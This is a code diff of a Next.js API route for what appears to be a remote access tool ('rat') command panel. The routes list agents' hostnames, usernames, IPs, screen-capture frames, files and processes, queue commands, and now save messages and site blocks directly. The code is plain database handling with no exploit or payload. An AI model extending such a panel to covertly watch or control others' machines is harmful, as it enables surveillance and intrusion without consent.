@@ -16,7 +16,6 @@ export async function GET(
   const agentId = decodeURIComponent(params.id)
 
   try {
-    // Get agent basic info
     const [agent] = await sql`
       SELECT 
         id, hostname, username, platform, ip, alias, last_seen,
@@ -30,19 +29,16 @@ export async function GET(
       return NextResponse.json({ error: 'Agent not found' }, { status: 404 })
     }
 
-    // Get latest stream frame if any
     const [stream] = await sql`
       SELECT frame_b64, captured_at 
       FROM rat_stream_frames 
       WHERE agent_id = ${agentId}
     `
 
-    // Get blocked sites
     const blocked = await sql`
       SELECT domain FROM rat_blocked_sites WHERE agent_id = ${agentId}
     `
 
-    // Get recent messages
     const messages = await sql`
       SELECT id, sender, body, created_at 
       FROM rat_messages 
@@ -51,9 +47,8 @@ export async function GET(
       LIMIT 50
     `
 
-    // Parse JSON fields
     let files = null
-    let file_cwd = null
+    let file_cwd: string | null = null
     let processes = null
 
     try {
@@ -66,10 +61,10 @@ export async function GET(
 
     return NextResponse.json({
       ...agent,
-      stream_frame: stream?.frame_b64,
-      stream_updated_at: stream?.captured_at,
-      blocked_sites: blocked.map(b => b.domain),
-      messages,
+      stream_frame: stream?.frame_b64 ?? null,
+      stream_updated_at: stream?.captured_at ?? null,
+      blocked_sites: (blocked as { domain: string }[]).map(b => b.domain),
+      messages: messages ?? [],
       files,
       file_cwd,
       processes,
@@ -91,7 +86,7 @@ export async function POST(
   }
 
   const agentId = decodeURIComponent(params.id)
-  
+
   try {
     const { type, payload } = await req.json()
 
@@ -99,19 +94,47 @@ export async function POST(
       return NextResponse.json({ error: 'Command type required' }, { status: 400 })
     }
 
-    console.log(`Sending command ${type} to agent ${agentId}`)
+    // FIX: persist admin messages to rat_messages immediately so they show in chat history
+    if (type === 'message' && payload?.body) {
+      await sql`
+        INSERT INTO rat_messages (agent_id, sender, body, created_at)
+        VALUES (${agentId}, 'admin', ${payload.body as string}, NOW())
+      `
+    }
 
-    // Insert command into database
+    // FIX: persist block_sites to rat_blocked_sites immediately so the list updates in the UI
+    if (type === 'block_sites' && Array.isArray(payload?.domains)) {
+      for (const domain of payload.domains as string[]) {
+        if (domain) await sql`
+          INSERT INTO rat_blocked_sites (agent_id, domain)
+          VALUES (${agentId}, ${domain})
+          ON CONFLICT (agent_id, domain) DO NOTHING
+        `
+      }
+    }
+
+    // FIX: persist unblock_sites to rat_blocked_sites immediately
+    if (type === 'unblock_sites' && Array.isArray(payload?.domains)) {
+      const domains = payload.domains as string[]
+      if (domains.length > 0) {
+        await sql`
+          DELETE FROM rat_blocked_sites
+          WHERE agent_id = ${agentId}
+          AND domain = ANY(${domains})
+        `
+      }
+    }
+
     const [command] = await sql`
       INSERT INTO rat_commands (agent_id, type, payload)
       VALUES (${agentId}, ${type}, ${JSON.stringify(payload || {})})
       RETURNING id
     `
 
-    return NextResponse.json({ 
-      success: true, 
+    return NextResponse.json({
+      success: true,
       command_id: command.id,
-      message: `Command ${type} queued for agent` 
+      message: `Command ${type} queued for agent`,
     })
   } catch (error) {
     console.error('Error sending command:', error)
@@ -119,7 +142,7 @@ export async function POST(
   }
 }
 
-// PATCH /api/rat/agents/[id] - Update agent (e.g., set alias)
+// PATCH /api/rat/agents/[id] - Update agent alias
 export async function PATCH(
   req: NextRequest,
   { params }: { params: { id: string } }
@@ -130,16 +153,10 @@ export async function PATCH(
   }
 
   const agentId = decodeURIComponent(params.id)
-  
+
   try {
     const { alias } = await req.json()
-
-    await sql`
-      UPDATE rat_agents 
-      SET alias = ${alias || null}
-      WHERE id = ${agentId}
-    `
-
+    await sql`UPDATE rat_agents SET alias = ${alias || null} WHERE id = ${agentId}`
     return NextResponse.json({ success: true })
   } catch (error) {
     console.error('Error updating agent:', error)
@@ -147,7 +164,7 @@ export async function PATCH(
   }
 }
 
-// DELETE /api/rat/agents/[id] - Remove agent
+// DELETE /api/rat/agents/[id] - Remove agent and all related data
 export async function DELETE(
   req: NextRequest,
   { params }: { params: { id: string } }
@@ -158,15 +175,13 @@ export async function DELETE(
   }
 
   const agentId = decodeURIComponent(params.id)
-  
+
   try {
-    // Delete related data first (foreign key constraints)
     await sql`DELETE FROM rat_stream_frames WHERE agent_id = ${agentId}`
     await sql`DELETE FROM rat_messages WHERE agent_id = ${agentId}`
     await sql`DELETE FROM rat_blocked_sites WHERE agent_id = ${agentId}`
     await sql`DELETE FROM rat_commands WHERE agent_id = ${agentId}`
     await sql`DELETE FROM rat_agents WHERE id = ${agentId}`
-
     return NextResponse.json({ success: true })
   } catch (error) {
     console.error('Error deleting agent:', error)
